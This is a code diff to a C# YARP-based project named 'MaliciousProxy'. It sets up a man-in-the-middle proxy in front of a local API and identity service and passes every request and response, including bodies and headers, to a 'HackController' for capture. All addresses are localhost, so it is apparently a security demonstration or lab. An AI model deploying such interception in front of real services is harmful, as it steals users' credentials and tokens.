@@ -2,6 +2,7 @@ using MaliciousProxy.Controllers;
 using System.Text;
 using Yarp.ReverseProxy.Configuration;
 using Yarp.ReverseProxy.Transforms;
+using Yarp.ReverseProxy.Transforms.Builder;
 
 namespace MaliciousProxy;
 
@@ -20,10 +21,21 @@ public class Program
             {
                 new()
                 {
-                    RouteId = "route1",
-                    ClusterId = "cluster1",
+                    RouteId = "apiRequests",
+                    ClusterId = "apiCluster",
                     Match = new RouteMatch
                     {
+                        Hosts = new[] { "localhost:7274" },
+                        Path = "{**all}"
+                    }
+                },
+                new()
+                {
+                    RouteId = "identity",
+                    ClusterId = "identityCluster",
+                    Match = new RouteMatch
+                    {
+                        Hosts = new[] { "localhost:5001" },
                         Path = "{**all}"
                     }
                 }
@@ -31,10 +43,18 @@ public class Program
             {
                 new()
                 {
-                    ClusterId = "cluster1",
+                    ClusterId = "apiCluster",
                     Destinations = new Dictionary<string, DestinationConfig>(StringComparer.OrdinalIgnoreCase)
                     {
-                        { "destination1", new DestinationConfig { Address = "https://localhost:7246" } },
+                        { "apiHost", new DestinationConfig { Address = "https://localhost:7275" } },
+                    }
+                },
+                new()
+                {
+                    ClusterId = "identityCluster",
+                    Destinations = new Dictionary<string, DestinationConfig>(StringComparer.OrdinalIgnoreCase)
+                    {
+                        { "identityHost", new DestinationConfig { Address = "https://localhost:5002" } },
                     }
                 }
             }).AddTransforms(builderContext =>
@@ -42,37 +62,15 @@ public class Program
                 builderContext.AddRequestTransform(async context =>
                 {
                     HttpRequest request = context.HttpContext.Request;
-                    HackController.AddData($"{request.Method} {request.Path}");
-                    string body = Encoding.UTF8.GetString((await request.BodyReader.ReadAsync()).Buffer);
-                    if (!string.IsNullOrEmpty(body))
-                    {
-                        HackController.AddData($"BODY {body}");
-                    }
+                    await HackController.AddRequest(request);
 
-                    foreach (var header in request.Headers)
-                    {
-                        HackController.AddData($"HEADER {header.Key}:{string.Join(",", header.Value)}");
-                    }
+                    request.Headers.Remove("Host");
+                    request.Headers.Add("Host", new Uri(context.DestinationPrefix).Authority);
                 });
                 builderContext.AddResponseTransform(async context =>
                 {
                     var response = context.ProxyResponse;
-                    if (response == null)
-                    {
-                        HackController.AddData("RESPONSE NULL");
-                        return;
-                    }
-
-                    HackController.AddData($"RESPONSE {response.StatusCode}");
-                    string body = await response.Content.ReadAsStringAsync();
-                    if (!string.IsNullOrEmpty(body))
-                    {
-                        HackController.AddData($"BODY {body}");
-                    }
-                    foreach (var header in response.Headers)
-                    {
-                        HackController.AddData($"HEADER {header.Key}:{string.Join(",", header.Value)}");
-                    }
+                    await HackController.AddResponse(response);
                 });
             });
 
